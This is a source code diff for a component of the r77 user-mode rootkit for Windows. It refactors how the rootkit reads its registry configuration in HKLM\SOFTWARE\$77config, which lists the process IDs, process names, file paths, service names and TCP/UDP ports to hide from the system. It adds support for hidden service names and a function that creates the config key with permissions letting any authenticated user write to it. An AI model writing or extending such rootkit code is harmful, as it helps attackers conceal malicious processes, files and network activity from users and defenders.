@@ -79,10 +79,10 @@ BOOL Is64BitProcess(DWORD processId, LPBOOL is64Bit)
 
 	return result;
 }
-PVOID GetFunction(LPCSTR dll, LPCSTR function)
+LPVOID GetFunction(LPCSTR dll, LPCSTR function)
 {
 	HMODULE module = GetModuleHandleA(dll);
-	return module ? (PVOID)GetProcAddress(module, function) : NULL;
+	return module ? (LPVOID)GetProcAddress(module, function) : NULL;
 }
 BOOL GetProcessIntegrityLevel(HANDLE process, LPDWORD integrityLevel)
 {
@@ -541,6 +541,189 @@ DWORD RvaToOffset(LPBYTE dll, DWORD rva)
 	}
 }
 
+PINTEGER_LIST CreateIntegerList()
+{
+	PINTEGER_LIST list = new INTEGER_LIST();
+	list->Count = 0;
+	list->Capacity = 16;
+	list->Values = new ULONG[list->Capacity];
+	return list;
+}
+VOID LoadIntegerListFromRegistryKey(PINTEGER_LIST list, HKEY key)
+{
+	DWORD count;
+	if (RegQueryInfoKeyW(key, NULL, NULL, NULL, NULL, NULL, NULL, &count, NULL, NULL, NULL, NULL) == ERROR_SUCCESS)
+	{
+		WCHAR valueName[100];
+
+		for (DWORD i = 0; i < count; i++)
+		{
+			DWORD valueNameLength = 100;
+			DWORD type;
+			DWORD value;
+			DWORD valueSize = sizeof(DWORD);
+
+			if (RegEnumValueW(key, i, valueName, &valueNameLength, NULL, &type, (LPBYTE)&value, &valueSize) == ERROR_SUCCESS && type == REG_DWORD && !IntegerListContains(list, value))
+			{
+				IntegerListAdd(list, value);
+			}
+		}
+	}
+}
+VOID DeleteIntegerList(PINTEGER_LIST list)
+{
+	delete[] list->Values;
+	ZeroMemory(list, sizeof(INTEGER_LIST));
+	delete list;
+}
+VOID IntegerListAdd(PINTEGER_LIST list, ULONG value)
+{
+	if (list->Count == list->Capacity)
+	{
+		list->Capacity += 16;
+		PULONG newValues = new ULONG[list->Capacity];
+		RtlCopyMemory(newValues, list->Values, list->Count * sizeof(ULONG));
+
+		PULONG oldValues = list->Values;
+		list->Values = newValues;
+		delete[] oldValues;
+	}
+
+	list->Values[list->Count++] = value;
+}
+BOOL IntegerListContains(PINTEGER_LIST list, ULONG value)
+{
+	for (DWORD i = 0; i < list->Count; i++)
+	{
+		if (list->Values[i] == value) return TRUE;
+	}
+
+	return FALSE;
+}
+BOOL CompareIntegerList(PINTEGER_LIST listA, PINTEGER_LIST listB)
+{
+	if (listA == listB)
+	{
+		return TRUE;
+	}
+	else if (listA == NULL || listB == NULL)
+	{
+		return FALSE;
+	}
+	else if (listA->Count != listB->Count)
+	{
+		return FALSE;
+	}
+	else
+	{
+		for (ULONG i = 0; i < listA->Count; i++)
+		{
+			if (listA->Values[i] != listB->Values[i]) return FALSE;
+		}
+
+		return TRUE;
+	}
+}
+
+PSTRING_LIST CreateStringList(BOOL ignoreCase)
+{
+	PSTRING_LIST list = new STRING_LIST();
+	list->Count = 0;
+	list->Capacity = 16;
+	list->IgnoreCase = ignoreCase;
+	list->Values = new LPWSTR[list->Capacity];
+	return list;
+}
+VOID LoadStringListFromRegistryKey(PSTRING_LIST list, HKEY key, DWORD maxStringLength)
+{
+	DWORD count;
+	if (RegQueryInfoKeyW(key, NULL, NULL, NULL, NULL, NULL, NULL, &count, NULL, NULL, NULL, NULL) == ERROR_SUCCESS)
+	{
+		WCHAR valueName[100];
+		PWCHAR value = new WCHAR[maxStringLength + 1];
+
+		for (DWORD i = 0; i < count; i++)
+		{
+			DWORD valueNameLength = 100;
+			DWORD type;
+			DWORD valueSize = maxStringLength;
+
+			if (RegEnumValueW(key, i, valueName, &valueNameLength, NULL, &type, (LPBYTE)value, &valueSize) == ERROR_SUCCESS && type == REG_SZ && !StringListContains(list, value))
+			{
+				StringListAdd(list, value);
+			}
+		}
+
+		delete[] value;
+	}
+}
+VOID DeleteStringList(PSTRING_LIST list)
+{
+	for (ULONG i = 0; i < list->Count; i++)
+	{
+		delete[] list->Values[i];
+	}
+
+	delete[] list->Values;
+	ZeroMemory(list, sizeof(STRING_LIST));
+	delete list;
+}
+VOID StringListAdd(PSTRING_LIST list, LPCWSTR value)
+{
+	if (value)
+	{
+		if (list->Count == list->Capacity)
+		{
+			list->Capacity += 16;
+			LPWSTR *newValues = new LPWSTR[list->Capacity];
+			RtlCopyMemory(newValues, list->Values, list->Count * sizeof(LPWSTR));
+
+			LPWSTR *oldValues = list->Values;
+			list->Values = newValues;
+			delete[] oldValues;
+		}
+
+		list->Values[list->Count] = new WCHAR[lstrlenW(value) + 1];
+		lstrcpyW(list->Values[list->Count++], value);
+	}
+}
+BOOL StringListContains(PSTRING_LIST list, LPCWSTR value)
+{
+	if (value)
+	{
+		for (DWORD i = 0; i < list->Count; i++)
+		{
+			if (list->IgnoreCase ? !lstrcmpiW(list->Values[i], value) : !lstrcmpW(list->Values[i], value)) return TRUE;
+		}
+	}
+
+	return FALSE;
+}
+BOOL CompareStringList(PSTRING_LIST listA, PSTRING_LIST listB)
+{
+	if (listA == listB)
+	{
+		return TRUE;
+	}
+	else if (listA == NULL || listB == NULL)
+	{
+		return FALSE;
+	}
+	else if (listA->Count != listB->Count)
+	{
+		return FALSE;
+	}
+	else
+	{
+		for (ULONG i = 0; i < listA->Count; i++)
+		{
+			if (listA->IgnoreCase && listB->IgnoreCase ? lstrcmpiW(listA->Values[i], listB->Values[i]) : lstrcmpW(listA->Values[i], listB->Values[i])) return FALSE;
+		}
+
+		return TRUE;
+	}
+}
+
 BOOL GetR77Processes(PR77_PROCESS r77Processes, LPDWORD count)
 {
 	BOOL result = TRUE;
@@ -685,324 +868,93 @@ VOID TerminateR77Service(DWORD excludedProcessId)
 	delete[] r77Processes;
 }
 
-VOID ReadR77ConfigKey(PR77_CONFIG config, HKEY key)
-{
-	// Read process ID's from the "pid" subkey.
-	HKEY pidKey;
-	if (RegOpenKeyExW(key, L"pid", 0, KEY_READ, &pidKey) == ERROR_SUCCESS)
-	{
-		DWORD count;
-		if (RegQueryInfoKeyW(pidKey, NULL, NULL, NULL, NULL, NULL, NULL, &count, NULL, NULL, NULL, NULL) == ERROR_SUCCESS)
-		{
-			WCHAR valueName[100];
-
-			for (DWORD i = 0; i < count; i++)
-			{
-				DWORD valueNameLength = 100;
-				DWORD type;
-				DWORD processId;
-				DWORD processIdSize = sizeof(DWORD);
-				if (RegEnumValueW(pidKey, i, valueName, &valueNameLength, NULL, &type, (LPBYTE)&processId, &processIdSize) == ERROR_SUCCESS && type == REG_DWORD && processId > 0)
-				{
-					BOOL isNew = TRUE;
-
-					for (DWORD p = 0; p < config->HiddenProcessIdCount; p++)
-					{
-						if (config->HiddenProcessIds[p] == processId)
-						{
-							isNew = FALSE;
-							break;
-						}
-					}
-
-					if (isNew && config->HiddenProcessIdCount < R77_CONFIG_MAX_HIDDEN_PROCESS_IDS)
-					{
-						config->HiddenProcessIds[config->HiddenProcessIdCount++] = processId;
-					}
-				}
-			}
-		}
-
-		RegCloseKey(pidKey);
-	}
-
-	// Read process names from the "process_names" subkey.
-	HKEY processNameKey;
-	if (RegOpenKeyExW(key, L"process_names", 0, KEY_READ, &processNameKey) == ERROR_SUCCESS)
-	{
-		DWORD count;
-		if (RegQueryInfoKeyW(processNameKey, NULL, NULL, NULL, NULL, NULL, NULL, &count, NULL, NULL, NULL, NULL) == ERROR_SUCCESS)
-		{
-			WCHAR valueName[100];
-			WCHAR processName[MAX_PATH + 1];
-
-			for (DWORD i = 0; i < count; i++)
-			{
-				DWORD valueNameLength = 100;
-				DWORD type;
-				DWORD processNameSize = MAX_PATH;
-				if (RegEnumValueW(processNameKey, i, valueName, &valueNameLength, NULL, &type, (LPBYTE)&processName, &processNameSize) == ERROR_SUCCESS && type == REG_SZ)
-				{
-					BOOL isNew = TRUE;
-
-					for (DWORD p = 0; p < config->HiddenProcessNameCount; p++)
-					{
-						if (!lstrcmpiW(config->HiddenProcessNames[p], processName))
-						{
-							isNew = FALSE;
-							break;
-						}
-					}
-
-					if (isNew && config->HiddenProcessNameCount < R77_CONFIG_MAX_HIDDEN_PROCESS_NAMES)
-					{
-						config->HiddenProcessNames[config->HiddenProcessNameCount] = new WCHAR[lstrlenW(processName) + 1];
-						lstrcpyW(config->HiddenProcessNames[config->HiddenProcessNameCount++], processName);
-					}
-				}
-			}
-		}
-
-		RegCloseKey(processNameKey);
-	}
-
-	// Read paths from the "paths" subkey.
-	HKEY pathKey;
-	if (RegOpenKeyExW(key, L"paths", 0, KEY_READ, &pathKey) == ERROR_SUCCESS)
-	{
-		DWORD count;
-		if (RegQueryInfoKeyW(pathKey, NULL, NULL, NULL, NULL, NULL, NULL, &count, NULL, NULL, NULL, NULL) == ERROR_SUCCESS)
-		{
-			WCHAR valueName[100];
-			WCHAR path[MAX_PATH + 1];
-
-			for (DWORD i = 0; i < count; i++)
-			{
-				DWORD valueNameLength = 100;
-				DWORD type;
-				DWORD pathSize = MAX_PATH;
-				if (RegEnumValueW(pathKey, i, valueName, &valueNameLength, NULL, &type, (LPBYTE)&path, &pathSize) == ERROR_SUCCESS && type == REG_SZ)
-				{
-					BOOL isNew = TRUE;
-
-					for (DWORD p = 0; p < config->HiddenPathCount; p++)
-					{
-						if (!lstrcmpiW(config->HiddenPaths[p], path))
-						{
-							isNew = FALSE;
-							break;
-						}
-					}
-
-					if (isNew && config->HiddenPathCount < R77_CONFIG_MAX_HIDDEN_PATHS)
-					{
-						config->HiddenPaths[config->HiddenPathCount] = new WCHAR[lstrlenW(path) + 1];
-						lstrcpyW(config->HiddenPaths[config->HiddenPathCount++], path);
-					}
-				}
-			}
-		}
-
-		RegCloseKey(pathKey);
-	}
-
-	// Read local TCP ports from the "tcp_local" subkey.
-	HKEY tcpLocalKey;
-	if (RegOpenKeyExW(key, L"tcp_local", 0, KEY_READ, &tcpLocalKey) == ERROR_SUCCESS)
-	{
-		DWORD count;
-		if (RegQueryInfoKeyW(tcpLocalKey, NULL, NULL, NULL, NULL, NULL, NULL, &count, NULL, NULL, NULL, NULL) == ERROR_SUCCESS)
-		{
-			WCHAR valueName[100];
-
-			for (DWORD i = 0; i < count; i++)
-			{
-				DWORD valueNameLength = 100;
-				DWORD type;
-				DWORD port;
-				DWORD portSize = sizeof(DWORD);
-				if (RegEnumValueW(tcpLocalKey, i, valueName, &valueNameLength, NULL, &type, (LPBYTE)&port, &portSize) == ERROR_SUCCESS && type == REG_DWORD && port > 0 && port < USHRT_MAX)
-				{
-					BOOL isNew = TRUE;
-
-					for (DWORD p = 0; p < config->HiddenTcpLocalPortCount; p++)
-					{
-						if (config->HiddenTcpLocalPorts[p] == port)
-						{
-							isNew = FALSE;
-							break;
-						}
-					}
-
-					if (isNew && config->HiddenTcpLocalPortCount < R77_CONFIG_MAX_HIDDEN_TCP_LOCAL_PORTS)
-					{
-						config->HiddenTcpLocalPorts[config->HiddenTcpLocalPortCount++] = (USHORT)port;
-					}
-				}
-			}
-		}
-
-		RegCloseKey(tcpLocalKey);
-	}
-
-	// Read remote TCP ports from the "tcp_remote" subkey.
-	HKEY tcpRemoteKey;
-	if (RegOpenKeyExW(key, L"tcp_remote", 0, KEY_READ, &tcpRemoteKey) == ERROR_SUCCESS)
-	{
-		DWORD count;
-		if (RegQueryInfoKeyW(tcpRemoteKey, NULL, NULL, NULL, NULL, NULL, NULL, &count, NULL, NULL, NULL, NULL) == ERROR_SUCCESS)
-		{
-			WCHAR valueName[100];
-
-			for (DWORD i = 0; i < count; i++)
-			{
-				DWORD valueNameLength = 100;
-				DWORD type;
-				DWORD port;
-				DWORD portSize = sizeof(DWORD);
-				if (RegEnumValueW(tcpRemoteKey, i, valueName, &valueNameLength, NULL, &type, (LPBYTE)&port, &portSize) == ERROR_SUCCESS && type == REG_DWORD && port > 0 && port < USHRT_MAX)
-				{
-					BOOL isNew = TRUE;
-
-					for (DWORD p = 0; p < config->HiddenTcpRemotePortCount; p++)
-					{
-						if (config->HiddenTcpRemotePorts[p] == port)
-						{
-							isNew = FALSE;
-							break;
-						}
-					}
-
-					if (isNew && config->HiddenTcpRemotePortCount < R77_CONFIG_MAX_HIDDEN_TCP_REMOTE_PORTS)
-					{
-						config->HiddenTcpRemotePorts[config->HiddenTcpRemotePortCount++] = (USHORT)port;
-					}
-				}
-			}
-		}
-
-		RegCloseKey(tcpRemoteKey);
-	}
-
-	// Read UDP ports from the "udp" subkey.
-	HKEY udpKey;
-	if (RegOpenKeyExW(key, L"udp", 0, KEY_READ, &udpKey) == ERROR_SUCCESS)
-	{
-		DWORD count;
-		if (RegQueryInfoKeyW(udpKey, NULL, NULL, NULL, NULL, NULL, NULL, &count, NULL, NULL, NULL, NULL) == ERROR_SUCCESS)
-		{
-			WCHAR valueName[100];
-
-			for (DWORD i = 0; i < count; i++)
-			{
-				DWORD valueNameLength = 100;
-				DWORD type;
-				DWORD port;
-				DWORD portSize = sizeof(DWORD);
-				if (RegEnumValueW(udpKey, i, valueName, &valueNameLength, NULL, &type, (LPBYTE)&port, &portSize) == ERROR_SUCCESS && type == REG_DWORD && port > 0 && port < USHRT_MAX)
-				{
-					BOOL isNew = TRUE;
-
-					for (DWORD p = 0; p < config->HiddenUdpPortCount; p++)
-					{
-						if (config->HiddenUdpPorts[p] == port)
-						{
-							isNew = FALSE;
-							break;
-						}
-					}
-
-					if (isNew && config->HiddenUdpPortCount < R77_CONFIG_MAX_HIDDEN_UDP_PORTS)
-					{
-						config->HiddenUdpPorts[config->HiddenUdpPortCount++] = (USHORT)port;
-					}
-				}
-			}
-		}
-
-		RegCloseKey(udpKey);
-	}
-}
 PR77_CONFIG LoadR77Config()
 {
 	PR77_CONFIG config = new R77_CONFIG();
-	config->HiddenProcessIdCount = 0;
-	config->HiddenProcessNameCount = 0;
-	config->HiddenPathCount = 0;
-	config->HiddenTcpLocalPortCount = 0;
-	config->HiddenTcpRemotePortCount = 0;
-	config->HiddenUdpPortCount = 0;
-	config->HiddenProcessIds = new DWORD[R77_CONFIG_MAX_HIDDEN_PROCESS_IDS];
-	config->HiddenProcessNames = new LPWSTR[R77_CONFIG_MAX_HIDDEN_PROCESS_NAMES];
-	config->HiddenPaths = new LPWSTR[R77_CONFIG_MAX_HIDDEN_PATHS];
-	config->HiddenTcpLocalPorts = new USHORT[R77_CONFIG_MAX_HIDDEN_TCP_LOCAL_PORTS];
-	config->HiddenTcpRemotePorts = new USHORT[R77_CONFIG_MAX_HIDDEN_TCP_REMOTE_PORTS];
-	config->HiddenUdpPorts = new USHORT[R77_CONFIG_MAX_HIDDEN_UDP_PORTS];
-	ZeroMemory(config->HiddenProcessIds, sizeof(DWORD) * R77_CONFIG_MAX_HIDDEN_PROCESS_IDS);
-	ZeroMemory(config->HiddenProcessNames, sizeof(LPWSTR) * R77_CONFIG_MAX_HIDDEN_PROCESS_NAMES);
-	ZeroMemory(config->HiddenPaths, sizeof(LPWSTR) * R77_CONFIG_MAX_HIDDEN_PATHS);
-	ZeroMemory(config->HiddenTcpLocalPorts, sizeof(USHORT) * R77_CONFIG_MAX_HIDDEN_TCP_LOCAL_PORTS);
-	ZeroMemory(config->HiddenTcpRemotePorts, sizeof(USHORT) * R77_CONFIG_MAX_HIDDEN_TCP_REMOTE_PORTS);
-	ZeroMemory(config->HiddenUdpPorts, sizeof(USHORT) * R77_CONFIG_MAX_HIDDEN_UDP_PORTS);
+	config->HiddenProcessIds = CreateIntegerList();
+	config->HiddenProcessNames = CreateStringList(TRUE);
+	config->HiddenPaths = CreateStringList(TRUE);
+	config->HiddenServiceNames = CreateStringList(TRUE);
+	config->HiddenTcpLocalPorts = CreateIntegerList();
+	config->HiddenTcpRemotePorts = CreateIntegerList();
+	config->HiddenUdpPorts = CreateIntegerList();
 
 	// Load configuration from HKEY_LOCAL_MACHINE\SOFTWARE\$77config
-	HKEY localConfigKey;
-	if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\" HIDE_PREFIX L"config", 0, KEY_READ | KEY_WOW64_64KEY, &localConfigKey) == ERROR_SUCCESS)
+	HKEY key;
+	if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\" HIDE_PREFIX L"config", 0, KEY_READ | KEY_WOW64_64KEY, &key) == ERROR_SUCCESS)
 	{
-		ReadR77ConfigKey(config, localConfigKey);
-		RegCloseKey(localConfigKey);
-	}
-
-	// Load configuration from HKEY_CURRENT_USER\SOFTWARE\$77config
-	HKEY usersKey;
-	if (RegOpenKeyExW(HKEY_USERS, NULL, 0, KEY_READ, &usersKey) == ERROR_SUCCESS)
-	{
-		// Enumerate subkeys of HKEY_USERS to retrieve the HKEY_CURRENT_USER key of each user.
-		DWORD usersCount;
-		if (RegQueryInfoKeyW(usersKey, NULL, NULL, NULL, &usersCount, NULL, NULL, NULL, NULL, NULL, NULL, NULL) == ERROR_SUCCESS)
+		// Read process ID's from the "pid" subkey.
+		HKEY pidKey;
+		if (RegOpenKeyExW(key, L"pid", 0, KEY_READ, &pidKey) == ERROR_SUCCESS)
 		{
-			WCHAR configKeyName[1000];
-
-			for (DWORD i = 0; i < usersCount; i++)
-			{
-				DWORD configKeyNameLength = 1000;
-				if (RegEnumKeyExW(usersKey, i, configKeyName, &configKeyNameLength, NULL, NULL, NULL, NULL) == ERROR_SUCCESS)
-				{
-					lstrcatW(configKeyName, L"\\Software\\" HIDE_PREFIX L"config");
-
-					HKEY configKey;
-					if (RegOpenKeyExW(HKEY_USERS, configKeyName, 0, KEY_READ, &configKey) == ERROR_SUCCESS)
-					{
-						ReadR77ConfigKey(config, configKey);
-						RegCloseKey(configKey);
-					}
-				}
-			}
+			LoadIntegerListFromRegistryKey(config->HiddenProcessIds, pidKey);
+			RegCloseKey(pidKey);
 		}
 
-		RegCloseKey(usersKey);
+		// Read process names from the "process_names" subkey.
+		HKEY processNameKey;
+		if (RegOpenKeyExW(key, L"process_names", 0, KEY_READ, &processNameKey) == ERROR_SUCCESS)
+		{
+			LoadStringListFromRegistryKey(config->HiddenProcessNames, processNameKey, MAX_PATH);
+			RegCloseKey(processNameKey);
+		}
+
+		// Read paths from the "paths" subkey.
+		HKEY pathKey;
+		if (RegOpenKeyExW(key, L"paths", 0, KEY_READ, &pathKey) == ERROR_SUCCESS)
+		{
+			LoadStringListFromRegistryKey(config->HiddenPaths, pathKey, MAX_PATH);
+			RegCloseKey(pathKey);
+		}
+
+		// Read service names from the "service_names" subkey.
+		HKEY serviceNameKey;
+		if (RegOpenKeyExW(key, L"service_names", 0, KEY_READ, &serviceNameKey) == ERROR_SUCCESS)
+		{
+			LoadStringListFromRegistryKey(config->HiddenServiceNames, serviceNameKey, MAX_PATH);
+			RegCloseKey(serviceNameKey);
+		}
+
+		// Read local TCP ports from the "tcp_local" subkey.
+		HKEY tcpLocalKey;
+		if (RegOpenKeyExW(key, L"tcp_local", 0, KEY_READ, &tcpLocalKey) == ERROR_SUCCESS)
+		{
+			LoadIntegerListFromRegistryKey(config->HiddenTcpLocalPorts, tcpLocalKey);
+			RegCloseKey(tcpLocalKey);
+		}
+
+		// Read remote TCP ports from the "tcp_remote" subkey.
+		HKEY tcpRemoteKey;
+		if (RegOpenKeyExW(key, L"tcp_remote", 0, KEY_READ, &tcpRemoteKey) == ERROR_SUCCESS)
+		{
+			LoadIntegerListFromRegistryKey(config->HiddenTcpRemotePorts, tcpRemoteKey);
+			RegCloseKey(tcpRemoteKey);
+		}
+
+		// Read UDP ports from the "udp" subkey.
+		HKEY udpKey;
+		if (RegOpenKeyExW(key, L"udp", 0, KEY_READ, &udpKey) == ERROR_SUCCESS)
+		{
+			LoadIntegerListFromRegistryKey(config->HiddenUdpPorts, udpKey);
+			RegCloseKey(udpKey);
+		}
+
+		RegCloseKey(key);
 	}
 
 	return config;
 }
 VOID DeleteR77Config(PR77_CONFIG config)
 {
-	for (DWORD i = 0; i < config->HiddenProcessNameCount; i++)
-	{
-		delete[] config->HiddenProcessNames[i];
-	}
-	for (DWORD i = 0; i < config->HiddenPathCount; i++)
-	{
-		delete[] config->HiddenPaths[i];
-	}
-
-	delete[] config->HiddenProcessIds;
-	delete[] config->HiddenProcessNames;
-	delete[] config->HiddenPaths;
-	delete[] config->HiddenTcpLocalPorts;
-	delete[] config->HiddenTcpRemotePorts;
-	delete[] config->HiddenUdpPorts;
+	DeleteIntegerList(config->HiddenProcessIds);
+	DeleteStringList(config->HiddenProcessNames);
+	DeleteStringList(config->HiddenPaths);
+	DeleteStringList(config->HiddenServiceNames);
+	DeleteIntegerList(config->HiddenTcpLocalPorts);
+	DeleteIntegerList(config->HiddenTcpRemotePorts);
+	DeleteIntegerList(config->HiddenUdpPorts);
 	ZeroMemory(config, sizeof(R77_CONFIG));
+	delete config;
 }
 BOOL CompareR77Config(PR77_CONFIG configA, PR77_CONFIG configB)
 {
@@ -1016,141 +968,52 @@ BOOL CompareR77Config(PR77_CONFIG configA, PR77_CONFIG configB)
 	}
 	else
 	{
-		if (configA->HiddenProcessIdCount == configB->HiddenProcessIdCount)
+		return
+			CompareIntegerList(configA->HiddenProcessIds, configB->HiddenProcessIds) &&
+			CompareStringList(configA->HiddenProcessNames, configB->HiddenProcessNames) &&
+			CompareStringList(configA->HiddenPaths, configB->HiddenPaths) &&
+			CompareStringList(configA->HiddenServiceNames, configB->HiddenServiceNames) &&
+			CompareIntegerList(configA->HiddenTcpLocalPorts, configB->HiddenTcpLocalPorts) &&
+			CompareIntegerList(configA->HiddenTcpRemotePorts, configB->HiddenTcpRemotePorts) &&
+			CompareIntegerList(configA->HiddenUdpPorts, configB->HiddenUdpPorts);
+	}
+}
+BOOL InstallR77Config(PHKEY key)
+{
+	if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\" HIDE_PREFIX L"config", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS | KEY_WOW64_64KEY, NULL, key, NULL) == ERROR_SUCCESS)
+	{
+		// Return TRUE, even if setting the DACL fails.
+		// If DACL creation failed, only elevated processes will be able to write to the configuration system.
+		PSECURITY_DESCRIPTOR securityDescriptor = NULL;
+		ULONG securityDescriptorSize = 0;
+		if (ConvertStringSecurityDescriptorToSecurityDescriptorW(L"D:(A;OICI;GA;;;AU)(A;OICI;GA;;;BA)", SDDL_REVISION_1, &securityDescriptor, &securityDescriptorSize))
 		{
-			for (DWORD i = 0; i < configA->HiddenProcessIdCount; i++)
-			{
-				if (configA->HiddenProcessIds[i] != configB->HiddenProcessIds[i]) return FALSE;
-			}
-		}
-		else
-		{
-			return FALSE;
-		}
-
-		if (configA->HiddenProcessNameCount == configB->HiddenProcessNameCount)
-		{
-			for (DWORD i = 0; i < configA->HiddenProcessNameCount; i++)
-			{
-				if (lstrcmpiW(configA->HiddenProcessNames[i], configB->HiddenProcessNames[i])) return FALSE;
-			}
-		}
-		else
-		{
-			return FALSE;
-		}
-
-		if (configA->HiddenPathCount == configB->HiddenPathCount)
-		{
-			for (DWORD i = 0; i < configA->HiddenPathCount; i++)
-			{
-				if (lstrcmpiW(configA->HiddenPaths[i], configB->HiddenPaths[i])) return FALSE;
-			}
-		}
-		else
-		{
-			return FALSE;
-		}
-
-		if (configA->HiddenTcpLocalPortCount == configB->HiddenTcpLocalPortCount)
-		{
-			for (DWORD i = 0; i < configA->HiddenTcpLocalPortCount; i++)
-			{
-				if (configA->HiddenTcpLocalPorts[i] != configB->HiddenTcpLocalPorts[i]) return FALSE;
-			}
-		}
-		else
-		{
-			return FALSE;
-		}
-
-		if (configA->HiddenTcpRemotePortCount == configB->HiddenTcpRemotePortCount)
-		{
-			for (DWORD i = 0; i < configA->HiddenTcpRemotePortCount; i++)
-			{
-				if (configA->HiddenTcpRemotePorts[i] != configB->HiddenTcpRemotePorts[i]) return FALSE;
-			}
-		}
-		else
-		{
-			return FALSE;
-		}
-
-		if (configA->HiddenUdpPortCount == configB->HiddenUdpPortCount)
-		{
-			for (DWORD i = 0; i < configA->HiddenUdpPortCount; i++)
-			{
-				if (configA->HiddenUdpPorts[i] != configB->HiddenUdpPorts[i]) return FALSE;
-			}
-		}
-		else
-		{
-			return FALSE;
+			RegSetKeySecurity(*key, DACL_SECURITY_INFORMATION, securityDescriptor);
+			LocalFree(securityDescriptor);
 		}
 
 		return TRUE;
 	}
+
+	return FALSE;
 }
 VOID UninstallR77Config()
 {
-	// Delete HKEY_LOCAL_MACHINE\$77config
-	RegDeleteKeyExW(HKEY_LOCAL_MACHINE, L"Software\\" HIDE_PREFIX L"config\\pid", KEY_ALL_ACCESS | KEY_WOW64_64KEY, 0);
-	RegDeleteKeyExW(HKEY_LOCAL_MACHINE, L"Software\\" HIDE_PREFIX L"config\\process_names", KEY_ALL_ACCESS | KEY_WOW64_64KEY, 0);
-	RegDeleteKeyExW(HKEY_LOCAL_MACHINE, L"Software\\" HIDE_PREFIX L"config\\paths", KEY_ALL_ACCESS | KEY_WOW64_64KEY, 0);
-	RegDeleteKeyExW(HKEY_LOCAL_MACHINE, L"Software\\" HIDE_PREFIX L"config\\tcp_local", KEY_ALL_ACCESS | KEY_WOW64_64KEY, 0);
-	RegDeleteKeyExW(HKEY_LOCAL_MACHINE, L"Software\\" HIDE_PREFIX L"config\\tcp_remote", KEY_ALL_ACCESS | KEY_WOW64_64KEY, 0);
-	RegDeleteKeyExW(HKEY_LOCAL_MACHINE, L"Software\\" HIDE_PREFIX L"config\\udp", KEY_ALL_ACCESS | KEY_WOW64_64KEY, 0);
-	RegDeleteKeyExW(HKEY_LOCAL_MACHINE, L"Software\\" HIDE_PREFIX L"config", KEY_ALL_ACCESS | KEY_WOW64_64KEY, 0);
-
-	// Delete HKEY_CURRENT_USER\$77config
-	HKEY usersKey;
-	if (RegOpenKeyExW(HKEY_USERS, NULL, 0, KEY_READ, &usersKey) == ERROR_SUCCESS)
+	// Delete subkeys in HKEY_LOCAL_MACHINE\SOFTWARE\$77config
+	HKEY key;
+	if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\" HIDE_PREFIX L"config", 0, KEY_ALL_ACCESS | KEY_WOW64_64KEY, &key) == ERROR_SUCCESS)
 	{
-		// Enumerate subkeys of HKEY_USERS to retrieve the HKEY_CURRENT_USER key of each user.
-		DWORD usersCount;
-		if (RegQueryInfoKeyW(usersKey, NULL, NULL, NULL, &usersCount, NULL, NULL, NULL, NULL, NULL, NULL, NULL) == ERROR_SUCCESS)
+		WCHAR subKeyName[1000];
+		for (DWORD subKeyNameLength = 1000; RegEnumKeyExW(key, 0, subKeyName, &subKeyNameLength, NULL, NULL, NULL, NULL) == ERROR_SUCCESS; subKeyNameLength = 1000)
 		{
-			WCHAR configKeyName[1000];
-			WCHAR subKeyName[1000];
-
-			for (DWORD i = 0; i < usersCount; i++)
-			{
-				DWORD configKeyNameLength = 1000;
-				if (RegEnumKeyExW(usersKey, i, configKeyName, &configKeyNameLength, NULL, NULL, NULL, NULL) == ERROR_SUCCESS)
-				{
-					lstrcatW(configKeyName, L"\\Software\\" HIDE_PREFIX L"config");
-
-					lstrcpyW(subKeyName, configKeyName);
-					lstrcatW(subKeyName, L"\\pid");
-					RegDeleteKeyExW(HKEY_USERS, subKeyName, KEY_ALL_ACCESS, 0);
-
-					lstrcpyW(subKeyName, configKeyName);
-					lstrcatW(subKeyName, L"\\process_names");
-					RegDeleteKeyExW(HKEY_USERS, subKeyName, KEY_ALL_ACCESS, 0);
-
-					lstrcpyW(subKeyName, configKeyName);
-					lstrcatW(subKeyName, L"\\paths");
-					RegDeleteKeyExW(HKEY_USERS, subKeyName, KEY_ALL_ACCESS, 0);
-
-					lstrcpyW(subKeyName, configKeyName);
-					lstrcatW(subKeyName, L"\\tcp_local");
-					RegDeleteKeyExW(HKEY_USERS, subKeyName, KEY_ALL_ACCESS, 0);
-
-					lstrcpyW(subKeyName, configKeyName);
-					lstrcatW(subKeyName, L"\\tcp_remote");
-					RegDeleteKeyExW(HKEY_USERS, subKeyName, KEY_ALL_ACCESS, 0);
-
-					lstrcpyW(subKeyName, configKeyName);
-					lstrcatW(subKeyName, L"\\udp");
-					RegDeleteKeyExW(HKEY_USERS, subKeyName, KEY_ALL_ACCESS, 0);
-
-					RegDeleteKeyExW(HKEY_USERS, configKeyName, KEY_ALL_ACCESS, 0);
-				}
-			}
+			RegDeleteKeyW(key, subKeyName);
 		}
 
-		RegCloseKey(usersKey);
+		RegCloseKey(key);
 	}
+
+	// Delete HKEY_LOCAL_MACHINE\SOFTWARE\$77config
+	RegDeleteKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\" HIDE_PREFIX L"config", KEY_ALL_ACCESS | KEY_WOW64_64KEY, 0);
 }
 
 DWORD WINAPI ChildProcessListenerThread(LPVOID parameter)
